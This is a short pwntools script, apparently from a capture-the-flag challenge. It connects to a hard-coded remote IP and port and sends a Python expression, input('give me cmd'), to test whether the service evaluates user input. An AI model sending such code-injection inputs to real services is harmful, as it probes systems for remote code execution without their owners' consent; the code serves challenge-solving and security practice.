from pwn import *

conn=remote("168.62.41.251 ",5950)



print conn.recvline()
conn.sendline("input('give me cmd')")
print conn.recvline()

